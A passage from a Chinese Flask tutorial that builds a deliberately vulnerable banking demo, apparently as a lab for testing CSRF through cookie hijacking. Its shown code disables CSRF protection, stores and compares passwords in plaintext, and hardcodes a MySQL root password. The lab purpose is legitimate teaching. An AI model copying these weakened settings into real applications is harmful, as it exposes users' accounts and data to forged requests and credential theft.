class="token operator">=</span><span class="token punctuation">[</span>Length<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token string">"用户名长度不符合"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   password <span class="token operator">=</span> PasswordField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Length<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">18</span><span class="token punctuation">,</span> <span class="token string">"密码长度不够"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 不验证复杂度</span>   password_repeat <span class="token operator">=</span> PasswordField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>EqualTo<span class="token punctuation">(</span><span class="token string">"password"</span><span class="token punctuation">,</span> <span class="token string">"密码不匹配"</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   phone <span class="token operator">=</span> StringField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Regexp<span class="token punctuation">(</span>r<span class="token string">'1[34578]\d{9}'</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'手机号不匹配'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">class</span> <span class="token class-name">SaveMoneyForm</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token triple-quoted-string string">"""构造存钱表单验证"""</span>   add_money <span class="token operator">=</span> FloatField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>NumberRange<span class="token punctuation">(</span>min<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> max<span class="token operator">=</span><span class="token number">10000</span><span class="token punctuation">,</span> message<span class="token operator">=</span><span class="token string">'1-10000'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 一次性最多10000</span><span class="token keyword">class</span> <span class="token class-name">TransferForm</span><span class="token punctuation">(</span>FlaskForm<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token triple-quoted-string string">"""构造转账页面表单验证"""</span>   transfer <span class="token operator">=</span> FloatField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>NumberRange<span class="token punctuation">(</span>min<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>max<span class="token operator">=</span><span class="token number">1000</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'1-1000'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 一次最多转账一千</span>   transfer_name <span class="token operator">=</span> StringField<span class="token punctuation">(</span>validators<span class="token operator">=</span><span class="token punctuation">[</span>Length<span class="token punctuation">(</span>min<span class="token operator">=</span><span class="token number">6</span><span class="token punctuation">,</span>max<span class="token operator">=</span><span class="token number">18</span><span class="token punctuation">,</span>message<span class="token operator">=</span><span class="token string">'6-18位字符串'</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="4-添加数据库支持"><a href="#4-添加数据库支持" class="headerlink" title="4.添加数据库支持"></a>4.添加数据库支持</h4><blockquote><p>使用<code>Flask-SQLAlchemy</code> 来提供操作<code>MySQL</code>.</p><p>需要注意的是,<code>app.py</code> 和<code>sql_model</code> 不能相互引用,必须借用第三个文件<code>exts.py</code> 来引用.</p><p>确保数据库中已经存在<code>flask_csrf_demo</code>数据库,如果不存在,需要创建.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># config.py</span><span class="token comment" spellcheck="true"># 数据库支持</span>msg <span class="token operator">=</span> <span class="token string">"mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/flask_csrf_demo"</span>SQLALCHEMY_DATABASE_URI <span class="token operator">=</span> msgSQLALCHEMY_TRACK_MODIFICATIONS <span class="token operator">=</span> <span class="token boolean">False</span> <span class="token comment" spellcheck="true"># 关闭追踪</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># exts.py</span><span class="token keyword">from</span> flask_sqlalchemy <span class="token keyword">import</span> SQLAlchemydb <span class="token operator">=</span> SQLAlchemy<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># app.py</span><span class="token keyword">from</span> exts <span class="token keyword">import</span> dbdb<span class="token punctuation">.</span>init_app<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>我们测试的效果是劫持<code>cookie</code>的情况下,让账户中的金额增长和减少,这样按照需求,设计一张表,只需要基本的信息即可.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># mysqlModel.py</span><span class="token keyword">from</span> exts <span class="token keyword">import</span> db<span class="token keyword">class</span> <span class="token class-name">BankUser</span><span class="token punctuation">(</span>db<span class="token punctuation">.</span>Model<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token triple-quoted-string string">"""ORM对应"""</span>   __tablename__ <span class="token operator">=</span> <span class="token string">'bankUser'</span>   id <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Integer<span class="token punctuation">,</span> primary_key<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">,</span> autoincrement<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>   email <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>   username <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>   password <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>   phone <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>String<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span>   balance <span class="token operator">=</span> db<span class="token punctuation">.</span>Column<span class="token punctuation">(</span>db<span class="token punctuation">.</span>Float<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nullable<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 余额</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></blockquote><h4 id="5-管理数据库版本"><a href="#5-管理数据库版本" class="headerlink" title="5.管理数据库版本"></a>5.管理数据库版本</h4><blockquote><p>创建<code>manager.py</code>来管理数据库版本</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> flask_script <span class="token keyword">import</span> Manager<span class="token keyword">from</span> exts <span class="token keyword">import</span> db<span class="token keyword">from</span> flask_migrate <span class="token keyword">import</span> MigrateCommand<span class="token punctuation">,</span> Migrate<span class="token keyword">from</span> app <span class="token keyword">import</span> app<span class="token keyword">from</span> mysqlModel <span class="token keyword">import</span> BankUsers<span class="token comment" spellcheck="true"># 导入Mnager并绑定app</span>manager <span class="token operator">=</span> Manager<span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 导入flaks_migrate</span><span class="token comment" spellcheck="true"># Migrate 绑定app,db</span>Migrate<span class="token punctuation">(</span>app<span class="token punctuation">,</span> db<span class="token punctuation">)</span><span class="token comment" spellcheck="true"># MigrateCommand 可以使用Alembic的命令</span><span class="token comment" spellcheck="true"># </span>manager<span class="token punctuation">.</span>add_command<span class="token punctuation">(</span><span class="token string">'db'</span><span class="token punctuation">,</span> MigrateCommand<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># db是别名</span><span class="token keyword">if</span> __name__  <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>   manager<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>测试:</p><pre class="line-numbers language-bash"><code class="language-bash">$ python manager.py db --helpusage: Perform database migrations<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>如果能正常出现内容,说明配置成功.然后创建数据库迁移脚本</p><pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true"># 初始化</span>❯ python manager.py db init<span class="token comment" spellcheck="true"># 创建迁移脚本</span>❯ python manager.py db migrate<span class="token comment" spellcheck="true"># 数据库版本升级 切换到hand</span>❯ python manager.py db upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>验证数据库</p><pre class="line-numbers language-sql"><code class="language-sql">❯ mycli <span class="token operator">-</span>h <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">0.101</span> <span class="token operator">-</span>u rootPassword: mysql root<span class="token variable">@192.168.0.101</span>:<span class="token punctuation">(</span>none<span class="token punctuation">)</span><span class="token operator">></span> <span class="token keyword">use</span> flask_csrf_demo<span class="token punctuation">;</span>                                               You are now connected <span class="token keyword">to</span> <span class="token keyword">database</span> <span class="token string">"flask_csrf_demo"</span> <span class="token keyword">as</span> <span class="token keyword">user</span> <span class="token string">"root"</span>Time: <span class="token number">0</span><span class="token punctuation">.</span>006smysql root<span class="token variable">@192.168.0.101</span>:flask_csrf_demo<span class="token operator">></span> <span class="token keyword">show</span> <span class="token keyword">tables</span><span class="token punctuation">;</span>                                              <span class="token operator">+</span><span class="token comment" spellcheck="true">---------------------------+</span><span class="token operator">|</span> Tables_in_flask_csrf_demo <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">---------------------------+</span><span class="token operator">|</span> alembic_version           <span class="token operator">|</span><span class="token operator">|</span> bankusers                 <span class="token operator">|</span><span class="token operator">+</span><span class="token comment" spellcheck="true">---------------------------+</span><span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span>Time: <span class="token number">0</span><span class="token punctuation">.</span>023s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上,创建数据库成功.</p></blockquote><h4 id="6-连接数据库并验证"><a href="#6-连接数据库并验证" class="headerlink" title="6.连接数据库并验证"></a>6.连接数据库并验证</h4><blockquote><p>修改<code>app.py</code>的<code>register\login</code>类,实现数据库注册和验证.</p><p>在实现之前,暂时关闭<code>CSRF</code></p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># config.py</span><span class="token comment" spellcheck="true"># 显式关闭CSRF</span>WTF_CSRF_ENABLED <span class="token operator">=</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># app.py</span><span class="token comment" spellcheck="true"># 注册页</span><span class="token keyword">class</span> <span class="token class-name">RegisterView</span><span class="token punctuation">(</span>views<span class="token punctuation">.</span>MethodView<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment" spellcheck="true"># 验证表单</span>      form <span class="token operator">=</span> RegisterForm<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token comment" spellcheck="true"># validata_on_submit自动判断post/get</span>      <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          email <span class="token operator">=</span> form<span class="token punctuation">.</span>email<span class="token punctuation">.</span>data          username <span class="token operator">=</span> form<span class="token punctuation">.</span>username<span class="token punctuation">.</span>data          password <span class="token operator">=</span> form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data          phone <span class="token operator">=</span> form<span class="token punctuation">.</span>phone<span class="token punctuation">.</span>data          <span class="token comment" spellcheck="true"># 插入数据库</span>          user <span class="token operator">=</span> BankUsers<span class="token punctuation">(</span>email<span class="token operator">=</span>email<span class="token punctuation">,</span> username<span class="token operator">=</span> username<span class="token punctuation">,</span> password<span class="token operator">=</span>password<span class="token punctuation">,</span> phone<span class="token operator">=</span>phone<span class="token punctuation">)</span>          db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>add<span class="token punctuation">(</span>user<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 添加用户</span>          db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>commit<span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token comment" spellcheck="true"># 提交数据</span>          <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span>      <span class="token keyword">else</span><span class="token punctuation">:</span>          <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'register.html'</span><span class="token punctuation">,</span> info<span class="token operator">=</span>form<span class="token punctuation">.</span>errors<span class="token punctuation">)</span> <span class="token comment" spellcheck="true"># 表单验证错误返回消息</span><span class="token comment" spellcheck="true"># 登录页</span><span class="token keyword">class</span> <span class="token class-name">LoginView</span><span class="token punctuation">(</span>views<span class="token punctuation">.</span>MethodView<span class="token punctuation">)</span><span class="token punctuation">:</span>  <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span>  <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>      <span class="token comment" spellcheck="true"># 验证表单</span>      form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>      <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>          <span class="token comment" spellcheck="true"># 表单验证成功,就跳转到数据库验证</span>          <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'表单验证成功'</span><span class="token punctuation">)</span>          email <span class="token operator">=</span> form<span class="token punctuation">.</span>email<span class="token punctuation">.</span>data           password <span class="token operator">=</span> form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data          lifetime <span class="token operator">=</span> form<span class="token punctuation">.</span>lifetime<span class="token punctuation">.</span>data          <span class="token comment" spellcheck="true"># 数据库判断</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>email<span class="token punctuation">,</span> password<span class="token punctuation">,</span> lifetime<span class="token punctuation">)</span>          exist_user <span class="token operator">=</span> db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>BankUsers<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>BankUsers<span class="token punctuation">.</span>email<span class="token operator">==</span>email<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>BankUsers<span class="token punctuation">.</span>password<span class="token operator">==</span>password<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>          <span class="token keyword">print</span><span class="token punctuation">(</span>exist_user<span class="token punctuation">)</span>          <span class="token keyword">if</span> exist_user <span class="token operator">!=</span> None<span class="token punctuation">:</span>              <span class="token keyword">if</span> lifetime<span class="token punctuation">:</span>                  <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'personal'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>              <span class="token keyword">else</span><span class="token punctuation">:</span>                  <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'personal'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>          <span class="token keyword">else</span><span class="token punctuation">:</span>              <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> info<span class="token operator">=</span>form<span class="token punctuation">.</span>errors<span class="token punctuation">)</span>      <span class="token keyword">else</span><span class="token punctuation">:</span>          <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> info<span class="token operator">=</span><span class="token string">"用户名密码不正确,请注册"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>以上的逻辑很简单,先验证表单,表单成功后,去数据库中验证,都验证成功后,跳转到个人页面(<code>personal.html</code>)</p><ul><li><p>运行项目后,进入注册页面,注册基本信息</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-15/1602770693749-10312.png" alt="10312"></p></li><li><p>然后进入登录页面,登录刚才的注册信息,注意我这里使用的是邮箱来验证的.</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-15/1602770693744-10313.png" alt="10313"></p></li></ul><ul><li>成功后会跳转到<code>personal.html</code></li></ul></blockquote><h4 id="7-添加session"><a href="#7-添加session" class="headerlink" title="7.添加session"></a>7.添加<code>session</code></h4><blockquote><p>逻辑是这样的,如果用户登录,那么就记录到<code>session</code>中,后续所有的操作都需要检查<code>session</code>数据.</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># config.py</span><span class="token keyword">import</span> os<span class="token keyword">from</span> datetime <span class="token keyword">import</span> timedelta<span class="token comment" spellcheck="true"># 配置session加密</span>SECRET_KEY <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 设置超时时间</span>PERMANENT_SESSION_LIFETIME<span class="token operator">=</span>timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># app.py</span><span class="token comment" spellcheck="true"># 登录页</span><span class="token keyword">class</span> <span class="token class-name">LoginView</span><span class="token punctuation">(</span>views<span class="token punctuation">.</span>MethodView<span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">)</span>   <span class="token keyword">def</span> <span class="token function">post</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>       <span class="token comment" spellcheck="true"># 验证表单</span>       form <span class="token operator">=</span> LoginForm<span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token keyword">if</span> form<span class="token punctuation">.</span>validate_on_submit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>           <span class="token comment" spellcheck="true"># 表单验证成功,就跳转到数据库验证</span>           <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'表单验证成功'</span><span class="token punctuation">)</span>           email <span class="token operator">=</span> form<span class="token punctuation">.</span>email<span class="token punctuation">.</span>data            password <span class="token operator">=</span> form<span class="token punctuation">.</span>password<span class="token punctuation">.</span>data           lifetime <span class="token operator">=</span> form<span class="token punctuation">.</span>lifetime<span class="token punctuation">.</span>data           <span class="token comment" spellcheck="true"># 数据库判断</span>           <span class="token keyword">print</span><span class="token punctuation">(</span>email<span class="token punctuation">,</span> password<span class="token punctuation">,</span> lifetime<span class="token punctuation">)</span>           exist_user <span class="token operator">=</span> db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>BankUsers<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>BankUsers<span class="token punctuation">.</span>email<span class="token operator">==</span>email<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>BankUsers<span class="token punctuation">.</span>password<span class="token operator">==</span>password<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>           <span class="token keyword">print</span><span class="token punctuation">(</span>exist_user<span class="token punctuation">)</span>           <span class="token keyword">if</span> exist_user <span class="token operator">!=</span> None<span class="token punctuation">:</span>               <span class="token keyword">if</span> lifetime<span class="token punctuation">:</span>                   session<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>                   session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> exist_user<span class="token punctuation">.</span>username                   session<span class="token punctuation">.</span>permanent <span class="token operator">=</span> <span class="token boolean">True</span>                   <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'personal'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>               <span class="token keyword">else</span><span class="token punctuation">:</span>                   session<span class="token punctuation">.</span>clear<span class="token punctuation">(</span><span class="token punctuation">)</span>                   session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> exist_user<span class="token punctuation">.</span>username                   <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'personal'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>           <span class="token keyword">else</span><span class="token punctuation">:</span>               <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> info<span class="token operator">=</span>form<span class="token punctuation">.</span>errors<span class="token punctuation">)</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>           <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'login.html'</span><span class="token punctuation">,</span> info<span class="token operator">=</span><span class="token string">"用户名密码不正确,请注册"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果点选<code>checkbox</code>,就设置<code>cookie</code>时长,否则关闭浏览器后<code>cookie</code>失效</p><ul><li><p>不点选<code>checkbox</code></p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-16/1602851484590-10315.png" alt="10315"></p></li><li><p>点选<code>checkbox</code></p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-16/1602851484596-10314.png" alt="10314"></p></li></ul></blockquote><h4 id="8-优化personal"><a href="#8-优化personal" class="headerlink" title="8.优化personal"></a>8.优化<code>personal</code></h4><blockquote><p>优化显示<code>personal</code>中的数据.</p><p>注意:<code>personal.html</code>中应该有接收后端数据的代码</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># app.py</span><span class="token comment" spellcheck="true"># 个人信息页面</span>@app<span class="token punctuation">.</span>route<span class="token punctuation">(</span><span class="token string">'/personal/'</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">personal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>   <span class="token keyword">if</span> session<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">,</span> None<span class="token punctuation">)</span><span class="token punctuation">:</span>       username <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span>       balance <span class="token operator">=</span> db<span class="token punctuation">.</span>session<span class="token punctuation">.</span>query<span class="token punctuation">(</span>BankUsers<span class="token punctuation">.</span>balance<span class="token punctuation">)</span><span class="token punctuation">.</span>filter<span class="token punctuation">(</span>BankUsers<span class="token punctuation">.</span>username <span class="token operator">==</span> username<span class="token punctuation">)</span><span class="token punctuation">.</span>first<span class="token punctuation">(</span><span class="token punctuation">)</span>       <span class="token keyword">return</span> render_template<span class="token punctuation">(</span><span class="token string">'personal.html'</span><span class="token punctuation">,</span> username<span class="token operator">=</span>username<span class="token punctuation">,</span> balance<span class="token operator">=</span>balance<span class="token punctuation">)</span>   <span class="token keyword">else</span><span class="token punctuation">:</span>       <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'LoginView'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>使用<code>session</code>登录之后,即可查询账户剩余金额</p><p><img src="https://cdn.jsdelivr.net/gh/ningwenyan/My_chat_picgo/2020-10-16/1602852040243-10316.png" alt="10316"></p></blockquote><h4 id="9-将session存储在redis中"><a href="#9-将session存储在redis中" class="headerlink" title="9.将session存储在redis中"></a>9.将<code>session</code>存储在<code>redis</code>中</h4><blockquote><p>修改<code>config.py</code>指定保存的类型</p><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># redisModel.py</span><span class="token keyword">from</span> redis <span class="token keyword">import</span> StrictRedisredis <span class="token operator">=</span> StrictRedis<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'192.168.0.101'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">6379</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python"><code class="language-python"><span class="token comment" spellcheck="true"># config.py</span><span class="token keyword">import</span> os<span class="token keyword">from</span> datetime <span class="token keyword">import</span> timedelta<span class="token keyword">from</span> redisModel <span class="token keyword">import</span> redisDEBUG <span class="token operator">=</span> <span class="token boolean">True</span>TEMPLATES_AUTO_RELOAD <span class="token operator">=</span> <span class="token boolean">True</span><span class="token comment" spellcheck="true"># 数据库支持</span>msg <span class="token operator">=</span> <span class="token string">"mysql+pymysql://root:2008.Cn123@192.168.0.101:3306/flask_csrf_demo"</span>SQLALCHEMY_DATABASE_URI <span class="token operator">=</span> msgSQLALCHEMY_TRACK_MODIFICATIONS <span class="token operator">=</span> <span class="token boolean">False</span> <span class="token comment" spellcheck="true"># 关闭追踪</span><span class="token comment" spellcheck="true"># 显式关闭CSRF</span>WTF_CSRF_ENABLED <span class="token operator">=</span> <span class="token boolean">False</span><span class="token comment" spellcheck="true"># 配置session加密</span>SECRET_KEY <span class="token operator">=</span> os<span class="token punctuation">.</span>urandom<span class="token punctuation">(</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># 设置超时时间</span>PERMANENT_SESSION_LIFETIME<span class="token operator">=</span>timedelta<span class="token punctuation">(</span>days<span class="token operator">=</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true"># session 保存在 redis中</span><span class="token comment" spellcheck="true"># 指定Session保存类型</span>SESSION_TYPE <span class="token operator">=</span> <span class="token string">'redis'</span>SESSION_USE_SIGNER <span class="token operator">=</span> <span class="token boolean">True</span> <span class="token comment" spellcheck="true"># 加密</span>SESSION_KEY_PREFIX<span class="token operator">=</span> <span class="token string">'session'</span>SESSION_REDIS <span class="token operator">=</span> redis<span aria-hidden="true" 